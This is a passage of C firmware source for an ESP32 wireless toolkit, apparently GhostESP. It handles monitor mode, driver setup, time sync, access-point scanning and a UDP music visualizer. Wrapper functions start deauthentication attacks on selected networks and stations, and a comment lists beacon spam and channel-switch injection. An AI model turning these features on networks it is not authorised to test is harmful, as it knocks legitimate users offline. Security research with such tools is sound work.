    if (filter.filter_mask == WIFI_PROMIS_FILTER_MASK_MGMT) filter_desc = "mgmt";
    else if (filter.filter_mask == WIFI_PROMIS_FILTER_MASK_DATA) filter_desc = "data";
    else if (filter.filter_mask == (WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA)) filter_desc = "mgmt+data";

    if (!pcap_is_wireshark_mode()) {
        printf("WiFi capture started.\n");
        TERMINAL_VIEW_ADD_TEXT("WiFi capture started.\n");
        printf("Type: %s\n", cap_desc);
        TERMINAL_VIEW_ADD_TEXT("Type: %s\n", cap_desc);
        printf("Channel: %u\n", (unsigned)ch_primary);
        TERMINAL_VIEW_ADD_TEXT("Channel: %u\n", (unsigned)ch_primary);
        printf("Filter: %s\n", filter_desc);
        TERMINAL_VIEW_ADD_TEXT("Filter: %s\n", filter_desc);
    }
    status_display_show_status("Monitor Started");
}
void wifi_manager_stop_monitor_mode() {
    // The active wardrive backend also owns this radio and its result list.
    // Fence its worker before releasing shared monitor tables or changing mode.
    if (wardriving_is_running()) stop_wardriving();
    wifi_monitor_capture_active = false;

    wifi_mode_t mode = WIFI_MODE_NULL;
    esp_err_t wifi_status = esp_wifi_get_mode(&mode);
    if (wifi_status == ESP_ERR_WIFI_NOT_INIT || mode == WIFI_MODE_NULL) {
        ESP_LOGW("WIFI_MANAGER", "Monitor stop called while Wi-Fi driver inactive (status=%s, mode=%d)",
                 esp_err_to_name(wifi_status), mode);
        // Driver is down so no RX can flow: still release session tables.
        wifi_callbacks_monitor_tables_release();
        return;
    } else if (wifi_status != ESP_OK) {
        ESP_LOGE("WIFI_MANAGER", "Failed to query Wi-Fi driver state: %s", esp_err_to_name(wifi_status));
        return;
    }

    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(NULL));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(false));
    status_display_show_status("Monitor Stopped");

    // Stop ALL channel hopping timers
    if (station_scan_is_active()) {
        station_scan_stop();
    }
    if (live_ap_hopping_active) {
        stop_live_ap_channel_hopping();
    }
    if (wireshark_hopping_active) {
        wifi_manager_stop_wireshark_channel_hop();
    }
    if (airspace_monitor_is_active()) {
        airspace_monitor_stop();
    }

    // NOTE: Stopping the PineAP timer (channel_hop_timer) is handled by stop_pineap_detection() in callbacks.c

    // Promiscuous delivery is off and hoppers are stopped above: safe to
    // release the heap-on-demand monitor tables (recreated next session).
    wifi_callbacks_monitor_tables_release();
}

void wifi_manager_init(void) {
    size_t mem_start = heap_caps_get_free_size(MALLOC_CAP_INTERNAL);
    ESP_LOGI(TAG, "wifi_manager_init: starting with %d bytes INTERNAL RAM free", (int)mem_start);

    // --- Memory check before WiFi init ---
    size_t free_heap = heap_caps_get_free_size(MALLOC_CAP_INTERNAL);
    if (free_heap < (45 * 1024)) {
        ESP_LOGW(TAG, "WARNING: Less than 45KB of free internal RAM available (%d bytes). WiFi may fail to initialize or operate reliably!", (int)free_heap);
        TERMINAL_VIEW_ADD_TEXT("WARNING: <45KB internal RAM free (%d bytes). WiFi may not initialize or operate reliably!\n", (int)free_heap);
    }

    esp_log_level_set("wifi", ESP_LOG_ERROR); // Only show errors, not warnings

#if !CONFIG_IDF_TARGET_ESP32P4
    // Disable WiFi power saving to improve connection stability
    esp_wifi_set_ps(WIFI_PS_NONE);
#endif

    ESP_LOGI(TAG, "wifi_manager: initializing NVS...");
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ESP_ERROR_CHECK(nvs_flash_init());
    }
    ESP_LOGI(TAG, "wifi_manager: NVS init done, free internal RAM: %d bytes (used: %d)", 
             (int)heap_caps_get_free_size(MALLOC_CAP_INTERNAL), 
             (int)(mem_start - heap_caps_get_free_size(MALLOC_CAP_INTERNAL)));

    // Initialize the TCP/IP stack and WiFi driver
    ESP_LOGI(TAG, "wifi_manager: initializing netif...");
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    wifiAP = esp_netif_create_default_wifi_ap();
    wifiSTA = esp_netif_create_default_wifi_sta();
    ESP_LOGI(TAG, "wifi_manager: netif init done, free internal RAM: %d bytes (used: %d)", 
             (int)heap_caps_get_free_size(MALLOC_CAP_INTERNAL), 
             (int)(mem_start - heap_caps_get_free_size(MALLOC_CAP_INTERNAL)));

    // Initialize WiFi with default settings
    ESP_LOGI(TAG, "wifi_manager: initializing WiFi driver...");
    ret = ap_manager_ensure_wifi_init();
    if (ret != ESP_OK) {
        // Wi-Fi is optional for boards whose primary interface is local. A
        // driver/configuration failure must not reboot the display firmware.
        ESP_LOGE(TAG, "wifi_manager: WiFi driver init failed: %s; continuing without WiFi",
                 esp_err_to_name(ret));
        TERMINAL_VIEW_ADD_TEXT("WiFi init failed: %s\n", esp_err_to_name(ret));
        return;
    }
    ESP_LOGI(TAG, "wifi_manager: WiFi driver init done, free internal RAM: %d bytes (used: %d)", 
             (int)heap_caps_get_free_size(MALLOC_CAP_INTERNAL), 
             (int)(mem_start - heap_caps_get_free_size(MALLOC_CAP_INTERNAL)));

    // configure country based on saved setting
    static const char *country_table[] = {"US", "GB", "JP", "AU", "CN", "01"};
    uint8_t country_idx = settings_get_wifi_country(&G_Settings);
    if (country_idx >= sizeof(country_table)/sizeof(country_table[0])) country_idx = 5; // default to World Safe

    esp_err_t country_err = esp_wifi_set_country_code(country_table[country_idx], true);
    if (country_err == ESP_OK) {
        ESP_LOGI(TAG, "Country set to: %s", country_table[country_idx]);
    } else {
        ESP_LOGW(TAG, "Failed to set country: %s", esp_err_to_name(country_err));
    }

    // Create the WiFi event group
    ESP_LOGI(TAG, "wifi_manager: creating event group...");
    wifi_event_group = xEventGroupCreate();
    ESP_LOGI(TAG, "wifi_manager: event group created, free internal RAM: %d bytes", 
             (int)heap_caps_get_free_size(MALLOC_CAP_INTERNAL));

    // Register the event handler for WiFi events
    ESP_LOGI(TAG, "wifi_manager: registering event handlers...");
    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
                                                        &wifi_event_handler, NULL, NULL));
    ESP_ERROR_CHECK(esp_event_handler_instance_register(IP_EVENT, IP_EVENT_STA_GOT_IP,
                                                        &wifi_event_handler, NULL, NULL));
    ESP_LOGI(TAG, "wifi_manager: event handlers registered, free internal RAM: %d bytes", 
             (int)heap_caps_get_free_size(MALLOC_CAP_INTERNAL));

    // AP-side diagnostics (connect/disconnect + dhcp assignment). helps debug portal connect failures.
    if (!g_ap_diag_registered) {
        esp_err_t r1 = esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
                                                          &wifi_ap_diag_event_handler, NULL, &g_ap_diag_wifi_inst);
        esp_err_t r2 = esp_event_handler_instance_register(IP_EVENT, IP_EVENT_AP_STAIPASSIGNED,
                                                          &wifi_ap_diag_event_handler, NULL, &g_ap_diag_ip_inst);
        if (r1 == ESP_OK && r2 == ESP_OK) {
            g_ap_diag_registered = true;
        } else {
            ESP_LOGW(TAG, "ap diag handler register failed: wifi=%s ip=%s",
                     esp_err_to_name(r1), esp_err_to_name(r2));
        }
    }

    // Bring the AP interface up only when the SoftAP is actually enabled in
    // settings. Running STA-only otherwise keeps the AP MAC (beaconing + AP
    // TX buffers) from activating, reclaiming internal RAM on starved boards.
    // The AP netif itself stays allocated above, so wifiAP is never NULL and
    // portal/AP code paths are unaffected. Attacks that inject on WIFI_IF_AP
    // (deauth, beacon spam, channel-switch) set AP mode themselves before TX;
    // eapol-logoff is hardened to do the same. Promiscuous/monitor and STA
    // scanning all work in STA mode, so sniffing/wardriving is unaffected.
    bool ap_enabled = settings_get_ap_enabled(&G_Settings);
    if (ap_enabled) {
        ESP_LOGI(TAG, "wifi_manager: setting WiFi mode to APSTA...");
        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
    } else {
        ESP_LOGI(TAG, "wifi_manager: AP disabled in settings, setting WiFi mode to STA...");
        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    }
    ESP_LOGI(TAG, "wifi_manager: WiFi mode set, free internal RAM: %d bytes",
             (int)heap_caps_get_free_size(MALLOC_CAP_INTERNAL));

    if (ap_enabled) {
        // Configure the SoftAP settings
        ESP_LOGI(TAG, "wifi_manager: configuring AP...");
        wifi_config_t ap_config = {
            .ap = {.ssid = "",
                   .ssid_len = strlen(""),
                   .password = "",
                   .channel = 1,
                   .authmode = WIFI_AUTH_OPEN,
                   .max_connection = 4,
                   .ssid_hidden = 1},
        };

        // Apply the AP configuration
        ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
    }

    // Start Wi-Fi
    ESP_LOGI(TAG, "wifi_manager: starting WiFi (esp_wifi_start)...");
    ESP_ERROR_CHECK(esp_wifi_start());
#if CONFIG_IDF_TARGET_ESP32P4
    /* The C6 rejects this before Wi-Fi init (ESP_ERR_WIFI_NOT_INIT).
     * Apply it after start, before the saved STA connection is requested. */
    esp_err_t ps_err = esp_wifi_set_ps(WIFI_PS_NONE);
    if (ps_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to disable STA power save: %s", esp_err_to_name(ps_err));
    }
#endif
    ESP_LOGI(TAG, "wifi_manager: WiFi started, free internal RAM: %d bytes", 
              (int)heap_caps_get_free_size(MALLOC_CAP_INTERNAL));
     
    // Additional WiFi stability settings
    // Set maximum TX power to improve signal strength
    esp_wifi_set_max_tx_power(78); // 19.5 dBm (78/4)
    
    // Set connection timeout to be more lenient
    esp_wifi_set_inactive_time(WIFI_IF_STA, 60); // 60 seconds before considering connection inactive

    // Initialize global CA certificate store
    ESP_LOGI(TAG, "wifi_manager: attaching CA certificate bundle...");
    ret = esp_crt_bundle_attach(NULL);
    if (ret == ESP_OK) {
        ESP_LOGI(TAG, "wifi_manager: CA bundle attached, free internal RAM: %d bytes", 
                 (int)heap_caps_get_free_size(MALLOC_CAP_INTERNAL));
        printf("Global CA certificate store initialized successfully.\n");
    } else {
        printf("Failed to initialize global CA certificate store: %s\n", esp_err_to_name(ret));
    }
    
    size_t mem_end = heap_caps_get_free_size(MALLOC_CAP_INTERNAL);
    ESP_LOGI(TAG, "wifi_manager_init: COMPLETE. Total used: %d bytes, free internal RAM: %d bytes", 
             (int)(mem_start - mem_end), (int)mem_end);
}

static void wifi_manager_handle_sntp_sync(struct timeval *tv) {
    if (!tv || tv->tv_sec <= 1600000000) return;

#ifdef CONFIG_HAS_RTC_CLOCK
    struct tm utc_timeinfo;
    gmtime_r(&tv->tv_sec, &utc_timeinfo);
    RTC_Date rtc_time;
    rtc_time.year = utc_timeinfo.tm_year + 1900;
    rtc_time.month = utc_timeinfo.tm_mon + 1;
    rtc_time.day = utc_timeinfo.tm_mday;
    rtc_time.hour = utc_timeinfo.tm_hour;
    rtc_time.minute = utc_timeinfo.tm_min;
    rtc_time.second = utc_timeinfo.tm_sec;

    if (rtc_set_datetime(&rtc_time) == ESP_OK) {
        ESP_LOGI(TAG, "Time synchronized from NTP and UTC saved to RTC: %04d-%02d-%02d %02d:%02d:%02d",
                 rtc_time.year, rtc_time.month, rtc_time.day,
                 rtc_time.hour, rtc_time.minute, rtc_time.second);
    }
#else
    ESP_LOGI(TAG, "Time synchronized from NTP");
#endif
}

/* A stale/default RTC value makes certificate verification fail even though
 * Wi-Fi and DNS are already working. Keep this floor aligned with OTA's TLS
 * guard and use the same gate for P4 Cloud Store requests. */
#define WIFI_TLS_TIME_VALID_AFTER 1767225600LL /* 2026-01-01 */

static bool wifi_manager_system_time_valid(void) {
    return time(NULL) >= WIFI_TLS_TIME_VALID_AFTER;
}

void wifi_manager_start_sntp(void) {
    // Register this for every target. Previously it was accidentally omitted
    // on boards without an RTC, making P4 SNTP success invisible in logs.
    esp_sntp_set_time_sync_notification_cb(wifi_manager_handle_sntp_sync);
    if (esp_sntp_enabled()) return;

    esp_sntp_setoperatingmode(SNTP_OPMODE_POLL);
    esp_sntp_setservername(0, "pool.ntp.org");
    esp_sntp_init();
}

bool wifi_manager_wait_for_valid_time(uint32_t timeout_ms) {
    if (wifi_manager_system_time_valid()) return true;

    wifi_manager_start_sntp();
    TickType_t start = xTaskGetTickCount();
    TickType_t timeout = pdMS_TO_TICKS(timeout_ms);
    do {
        if (wifi_manager_system_time_valid()) return true;
        vTaskDelay(pdMS_TO_TICKS(250));
    } while ((xTaskGetTickCount() - start) < timeout);

    ESP_LOGW(TAG, "HTTPS skipped: system time is not valid for certificate verification");
    return false;
}

void wifi_manager_configure_sta_from_settings(void) {
    wifi_reconnect_reset();

    // wifi_manager_init() can leave the local UI running when the radio
    // cannot initialize. Do not dereference the event group in that state.
    if (wifi_event_group == NULL) {
        ESP_LOGW(TAG, "Skipping STA configuration because WiFi is not initialized");
        return;
    }

    if (!wifi_driver_started) {
        esp_err_t start_err = esp_wifi_start();
        if (start_err != ESP_OK && start_err != ESP_ERR_WIFI_STATE) {
            printf("Failed to start WiFi for STA connection: %s\n", esp_err_to_name(start_err));
            return;
        }
        wifi_driver_started = true;
    }

    // Configure STA with saved credentials for boot-time connection
    const char *saved_ssid = settings_get_sta_ssid(&G_Settings);
    const char *saved_password = settings_get_sta_password(&G_Settings);
    if (saved_ssid && strlen(saved_ssid) > 0) {
        wifi_config_t sta_config = {
            .sta = {
                .threshold.authmode = (saved_password && strlen(saved_password) > 0) ? WIFI_AUTH_WPA_WPA2_PSK : WIFI_AUTH_OPEN,
                .pmf_cfg = {.capable = true, .required = false},
            },
        };
        
        strlcpy((char *)sta_config.sta.ssid, saved_ssid, sizeof(sta_config.sta.ssid));
        if (saved_password) {
            strlcpy((char *)sta_config.sta.password, saved_password, sizeof(sta_config.sta.password));
        }
        
        esp_err_t err = esp_wifi_set_config(WIFI_IF_STA, &sta_config);
        if (err == ESP_OK) {
            printf("STA configured with saved credentials: %s\n", saved_ssid);
            
            printf("Attempting boot-time connection to: %s\n", saved_ssid);
            TERMINAL_VIEW_ADD_TEXT("Connecting to saved network: %s\n", saved_ssid);
            
            esp_err_t connect_err = esp_wifi_connect();
            if (connect_err == ESP_ERR_WIFI_NOT_STARTED) {
                esp_err_t start_err = esp_wifi_start();
                if (start_err == ESP_OK || start_err == ESP_ERR_WIFI_STATE) {
                    wifi_driver_started = true;
                    connect_err = esp_wifi_connect();
                }
            }
            if (connect_err != ESP_OK) {
                printf("Failed to initiate connection: %s\n", esp_err_to_name(connect_err));
                TERMINAL_VIEW_ADD_TEXT("Failed to connect to saved network\n");
            }
        } else {
            printf("Failed to configure STA: %s\n", esp_err_to_name(err));
        }
    } else {
        printf("No saved WiFi credentials found\n");
    }
}

// Start WiFi scan - delegated to ap_scan module
void wifi_manager_start_scan() {
    ap_scan_start();
}

// Stop scanning for networks
void wifi_manager_stop_scan() {
    esp_err_t err;

    log_heap_status(TAG, "scan_stop_pre");
    err = esp_wifi_scan_stop();
    if (err == ESP_ERR_WIFI_NOT_STARTED) {

        // commented out for now because it's cleaner without and stop commands send this when not
        // really needed

        /*printf("WiFi scan was not active.\n");
        TERMINAL_VIEW_ADD_TEXT("WiFi scan was not active.\n"); */

        return;
    } else if (err != ESP_OK) {
        printf("Failed to stop WiFi scan: %s\n", esp_err_to_name(err));
        TERMINAL_VIEW_ADD_TEXT("Failed to stop WiFi scan\n");
        return;
    }

    wifi_manager_stop_monitor_mode();
    rgb_manager_set_color(&rgb_manager, -1, 0, 0, 0, false);

    uint16_t initial_ap_count = 0;
    err = esp_wifi_scan_get_ap_num(&initial_ap_count);
    if (err != ESP_OK) {
        printf("Failed to get AP count: %s\n", esp_err_to_name(err));
        TERMINAL_VIEW_ADD_TEXT("Failed to get AP count: %s\n", esp_err_to_name(err));
        return;
    }

    // only print AP count once, no need for both "Initial" and "Actual"
    printf("Found %u access points\n", initial_ap_count);
    TERMINAL_VIEW_ADD_TEXT("Found %u access points\n", initial_ap_count);

    // truncate to avoid excessive memory usage
    if (initial_ap_count > MAX_SCANNED_APS) {
        printf("too many aps (%u). truncating list to first %d\n", initial_ap_count, MAX_SCANNED_APS);
        TERMINAL_VIEW_ADD_TEXT("showing first %d aps (truncated)\n", MAX_SCANNED_APS);
        initial_ap_count = MAX_SCANNED_APS;
    }
    if (initial_ap_count > 0) {
        if (scanned_aps != NULL) {
            free(scanned_aps);
            scanned_aps = NULL;
        }
        
        if (selected_aps != NULL) {
            free(selected_aps);
            selected_aps = NULL;
            selected_ap_count = 0;
        }

        scanned_aps = spiram_calloc(initial_ap_count, sizeof(wifi_ap_record_t));
        if (scanned_aps == NULL) {
            printf("Failed to allocate memory for AP info\n");
            ap_count = 0;
            return;
        }

        uint16_t actual_ap_count = initial_ap_count;
        err = esp_wifi_scan_get_ap_records(&actual_ap_count, scanned_aps);
        if (err != ESP_OK) {
            printf("Failed to get AP records: %s\n", esp_err_to_name(err));
            free(scanned_aps);
            scanned_aps = NULL;
            ap_count = 0;
            return;
        }

        ap_count = actual_ap_count;
    } else {
        printf("No access points found\n");
        ap_count = 0;
    }
}

// List stations - delegated to station_scan module
void wifi_manager_list_stations() {
    station_scan_print_results();
}

// Start deauth function - wrapper for deauth_attack module
void wifi_manager_start_deauth() {
    deauth_attack_start();
}

// Select AP - delegated to ap_scan module
void wifi_manager_select_ap(int index) {
    esp_err_t err = ap_scan_select(index);
    if (err == ESP_OK) {
        // Update local selected_ap for compatibility with other functions
        ap_scan_get_selection(&selected_ap);
        // Sync multi-AP selection so capture channel plan can lock to the AP's channel
        if (selected_aps != NULL) {
            free(selected_aps);
            selected_aps = NULL;
        }
        wifi_ap_record_t *scan_aps = NULL;
        int scan_count = 0;
        ap_scan_get_selected(&scan_aps, &scan_count);
        if (scan_count > 0 && scan_aps != NULL) {
            selected_aps = spiram_malloc((size_t)scan_count * sizeof(wifi_ap_record_t));
            if (selected_aps != NULL) {
                memcpy(selected_aps, scan_aps, (size_t)scan_count * sizeof(wifi_ap_record_t));
                selected_ap_count = scan_count;
            } else {
                selected_ap_count = 0;
            }
        } else {
            selected_ap_count = 0;
        }
    }
}

void wifi_manager_select_multiple_aps(int *indices, int count) {
    if (ap_count == 0) {
        printf("No access points found\n");
        TERMINAL_VIEW_ADD_TEXT("No access points found\n");
        return;
    }

    if (scanned_aps == NULL) {
        printf("No AP info available (scanned_aps is NULL)\n");
        TERMINAL_VIEW_ADD_TEXT("No AP info available (scanned_aps is NULL)\n");
        return;
    }

    if (count <= 0) {
        printf("Invalid count: %d\n", count);
        TERMINAL_VIEW_ADD_TEXT("Invalid count: %d\n", count);
        return;
    }

    for (int i = 0; i < count; i++) {
        if (indices[i] < 0 || indices[i] >= ap_count) {
            printf("Invalid index: %d. Index should be between 0 and %d\n", indices[i], ap_count - 1);
            TERMINAL_VIEW_ADD_TEXT("Invalid index: %d. Index should be between 0 and %d\n", indices[i], ap_count - 1);
            return;
        }
    }

    if (selected_aps != NULL) {
        free(selected_aps);
        selected_aps = NULL;
    }

    selected_aps = spiram_malloc((size_t)count * sizeof(wifi_ap_record_t));
    if (selected_aps == NULL) {
        printf("Failed to allocate memory for selected APs\n");
        TERMINAL_VIEW_ADD_TEXT("Failed to allocate memory for selected APs\n");
        selected_ap_count = 0;
        return;
    }

    selected_ap_count = count;

    for (int i = 0; i < count; i++) {
        selected_aps[i] = scanned_aps[indices[i]];
    }

    selected_ap = selected_aps[0];

    printf("Selected %d Access Points:\n", count);
    TERMINAL_VIEW_ADD_TEXT("Selected %d Access Points:\n", count);

    for (int i = 0; i < count; i++) {
        char sanitized_ssid[33];
        sanitize_ssid_and_check_hidden(selected_aps[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));

        printf("[%d] SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X%s\n",
               i, sanitized_ssid,
               selected_aps[i].bssid[0], selected_aps[i].bssid[1], selected_aps[i].bssid[2],
               selected_aps[i].bssid[3], selected_aps[i].bssid[4], selected_aps[i].bssid[5],
               (i == 0) ? " (Primary)" : "");

        TERMINAL_VIEW_ADD_TEXT("[%d] SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X%s\n",
               i, sanitized_ssid,
               selected_aps[i].bssid[0], selected_aps[i].bssid[1], selected_aps[i].bssid[2],
               selected_aps[i].bssid[3], selected_aps[i].bssid[4], selected_aps[i].bssid[5],
               (i == 0) ? " (Primary)" : "");
    }

    printf("Multiple APs selected successfully. Primary AP: %s\n", 
           (char*)selected_ap.ssid);
    TERMINAL_VIEW_ADD_TEXT("Multiple APs selected successfully.\n");
}

void wifi_manager_get_selected_aps(wifi_ap_record_t **aps, int *count) {
    if (aps != NULL) {
        *aps = selected_aps;
    }
    if (count != NULL) {
        *count = selected_ap_count;
    }
}

// Select station - delegated to station_scan module
void wifi_manager_select_station(int index) {
    station_scan_select(index);
}

// Deauth station function - wrapper for deauth_attack module
void wifi_manager_deauth_station(void) {
    deauth_attack_start_station();
}

#define MAX_PAYLOAD 64
#define UDP_PORT 6677
#define VIS_DISCOVERY_PORT 6678
#define VIS_DISCOVERY_PAYLOAD "GHOSTESP_RAVE_DISCOVER_V1"
#define VIS_RECV_TIMEOUT_MS 250
#define VIS_DISCOVERY_INTERVAL_US 1000000ULL
#define TRACK_NAME_LEN 32
#define ARTIST_NAME_LEN 32
#define NUM_BARS 15

void screen_music_visualizer_task(void *pvParameters) {
    (void)pvParameters;
    char rx_buffer[128];
    uint8_t amplitudes[NUM_BARS];

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(UDP_PORT);
    dest_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    struct sockaddr_in helper_discovery_addr;
    helper_discovery_addr.sin_family = AF_INET;
    helper_discovery_addr.sin_port = htons(VIS_DISCOVERY_PORT);
    helper_discovery_addr.sin_addr.s_addr = htonl(INADDR_BROADCAST);

    visualizer_stop_requested = false;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        printf("Unable to create socket: errno %d\n", errno);
        VisualizerHandle = NULL;
        vTaskDelete(NULL);
    }

    visualizer_socket = sock;

    printf("Socket created\n");

    struct timeval recv_timeout = {
        .tv_sec = 0,
        .tv_usec = VIS_RECV_TIMEOUT_MS * 1000,
    };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &recv_timeout, sizeof(recv_timeout));

    int err = bind(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    if (err < 0) {
        printf("Socket unable to bind: errno %d\n", errno);
        close(sock);
        visualizer_socket = -1;
        VisualizerHandle = NULL;
        vTaskDelete(NULL);
    }

    printf("Socket bound, port %d\n", UDP_PORT);

    int discover_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (discover_sock >= 0) {
        int broadcast_enable = 1;
        setsockopt(discover_sock, SOL_SOCKET, SO_BROADCAST, &broadcast_enable, sizeof(broadcast_enable));
    }
    int64_t last_discovery_us = 0;

    while (!visualizer_stop_requested) {
        int64_t now_us = esp_timer_get_time();
        if (discover_sock >= 0 && (now_us - last_discovery_us) >= VIS_DISCOVERY_INTERVAL_US) {
            sendto(discover_sock,
                   VIS_DISCOVERY_PAYLOAD,
                   strlen(VIS_DISCOVERY_PAYLOAD),
                   0,
                   (struct sockaddr *)&helper_discovery_addr,
                   sizeof(helper_discovery_addr));
            last_discovery_us = now_us;
        }

        struct sockaddr_in source_addr;
        socklen_t socklen = sizeof(source_addr);

        int len = recvfrom(sock, rx_buffer, sizeof(rx_buffer) - 1, 0,
                           (struct sockaddr *)&source_addr, &socklen);
        if (len < 0) {
            if (visualizer_stop_requested) {
                break;
            }

            int err = errno;
            if (err == EAGAIN || err == EWOULDBLOCK || err == ETIMEDOUT || err == EINTR) {
                continue;
            }

            if (err == ENETDOWN || err == ENETUNREACH || err == EHOSTUNREACH ||
                err == ENOTCONN || err == EADDRNOTAVAIL) {
                vTaskDelay(pdMS_TO_TICKS(80));
                continue;
            }

            if (err == EBADF || err == ENOTSOCK) {
                printf("recvfrom socket invalid: errno %d\n", err);
                break;
            }

            printf("recvfrom transient error: errno %d\n", err);
            vTaskDelay(pdMS_TO_TICKS(80));
            continue;
        }

        rx_buffer[len] = '\0';

        if (len >= TRACK_NAME_LEN + ARTIST_NAME_LEN + NUM_BARS) {
            memcpy(amplitudes, rx_buffer + TRACK_NAME_LEN + ARTIST_NAME_LEN, NUM_BARS);

#if defined(CONFIG_WITH_SCREEN) || defined(WITH_SCREEN)
            music_visualizer_view_update(amplitudes, "LIVE INPUT", "Desktop Audio (Wi-Fi)");
#endif
        } else {
            printf("Received packet of unexpected size\n");
        }
    }

    if (sock != -1) {
        printf("Shutting down socket and restarting...\n");
        shutdown(sock, 0);
        close(sock);
    }
    if (discover_sock >= 0) {
        close(discover_sock);
    }

    visualizer_socket = -1;
    visualizer_stop_requested = false;
    VisualizerHandle = NULL;
    vTaskDelete(NULL);
}
void animate_led_based_on_amplitude(void *pvParameters) {
    (void)pvParameters;
    char rx_buffer[128];
    char addr_str[128];
    int addr_family = AF_INET;
    int ip_protocol = IPPROTO_IP;
    struct sockaddr_in dest_addr;

    dest_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    dest_addr.sin_family = addr_family;
    dest_addr.sin_port = htons(UDP_PORT);

    visualizer_stop_requested = false;

    int sock = socket(addr_family, SOCK_DGRAM, ip_protocol);
    if (sock < 0) {
        printf("Unable to create socket: errno %d\n", errno);
        VisualizerHandle = NULL;
        vTaskDelete(NULL);
    }
    visualizer_socket = sock;
    printf("Socket created\n");

    if (bind(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
        printf("Socket unable to bind: errno %d\n", errno);
        close(sock);
        visualizer_socket = -1;
        VisualizerHandle = NULL;
        vTaskDelete(NULL);
    }
    printf("Socket bound, port %d\n", UDP_PORT);

    float amplitude = 0.0f;
    float last_amplitude = 0.0f;
    float smoothing_factor = 0.1f;
    int hue = 0;
    
    uint32_t last_error_time = 0;
    const uint32_t error_rate_limit_ms = 5000;

    while (!visualizer_stop_requested) {
        struct sockaddr_in source_addr;
        socklen_t socklen = sizeof(source_addr);
        int len = recvfrom(sock, rx_buffer, sizeof(rx_buffer) - 1, MSG_DONTWAIT,
                           (struct sockaddr *)&source_addr, &socklen);

        if (len > 0) {
            rx_buffer[len] = '\0';
            inet_ntoa_r(source_addr.sin_addr, addr_str, sizeof(addr_str) - 1);
            printf("Received %d bytes from %s: %s\n", len, addr_str, rx_buffer);

            amplitude = atof(rx_buffer);
            amplitude = fmaxf(0.0f, fminf(amplitude, 1.0f)); // Clamp between 0.0 and 1.0

            // Smooth amplitude to avoid sudden changes (optional)
            amplitude =
                (smoothing_factor * amplitude) + ((1.0f - smoothing_factor) * last_amplitude);
            last_amplitude = amplitude;
        } else {
            // Gradually decrease amplitude when no data is received
            amplitude = last_amplitude * 0.9f; // Adjust decay rate as needed
            last_amplitude = amplitude;
        }

        // Ensure amplitude doesn't go below zero
        amplitude = fmaxf(0.0f, amplitude);

        hue = (int)(amplitude * 360) % 360;

        float h = hue / 60.0f;
        float s = 1.0f;
        float v = amplitude;

        int i = (int)h % 6;
        float f = h - (int)h;
        float p = v * (1.0f - s);
        float q = v * (1.0f - f * s);
        float t = v * (1.0f - (1.0f - f) * s);

        float r = 0.0f, g = 0.0f, b = 0.0f;
        switch (i) {
        case 0:
            r = v;
            g = t;
            b = p;
            break;
        case 1:
            r = q;
            g = v;
            b = p;
            break;
        case 2:
            r = p;
            g = v;
            b = t;
            break;
        case 3:
            r = p;
            g = q;
            b = v;
            break;
        case 4:
            r = t;
            g = p;
            b = v;
            break;
        case 5:
            r = v;
            g = p;
            b = q;
            break;
        }

        uint8_t red = (uint8_t)(r * 255);
        uint8_t green = (uint8_t)(g * 255);
        uint8_t blue = (uint8_t)(b * 255);

        esp_err_t ret = rgb_manager_set_color(&rgb_manager, 0, red, green, blue, false);
        if (ret != ESP_OK) {
            printf("Failed to set color\n");
        }

        vTaskDelay(10 / portTICK_PERIOD_MS);
    }

    if (sock != -1) {
        printf("Shutting down socket...\n");
        shutdown(sock, 0);
        close(sock);
    }

    visualizer_socket = -1;
    visualizer_stop_requested = false;
    VisualizerHandle = NULL;
    vTaskDelete(NULL);
}

#define START_HOST 1
#define END_HOST 254
#define SCAN_TIMEOUT_MS 100
#define HOST_TIMEOUT_MS 100
#define WIFI_CONNECTED_BIT BIT0
#define WIFI_FAIL_BIT BIT1
#define MAX_OPEN_PORTS 64

uint16_t calculate_checksum(uint16_t *addr, int len) {
    int nleft = len;
    uint32_t sum = 0;
    uint16_t *w = addr;
    uint16_t answer = 0;

    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == 1) {
        *(unsigned char *)(&answer) = *(unsigned char *)w;
        sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    answer = ~sum;
    return answer;
}

bool get_subnet_prefix(scanner_ctx_t *ctx) {
    esp_netif_t *netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!netif) {
        printf("Failed to get WiFi interface\n");
        TERMINAL_VIEW_ADD_TEXT("Failed to get WiFi interface\n");
        return false;
    }

    // Check if WiFi is connected
    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK) {
        printf("WiFi is not connected\n");
        TERMINAL_VIEW_ADD_TEXT("WiFi is not connected\n");
        return false;
    }

    // Get IP info
    esp_netif_ip_info_t ip_info;
    if (esp_netif_get_ip_info(netif, &ip_info) != ESP_OK) {
        printf("Failed to get IP info\n");
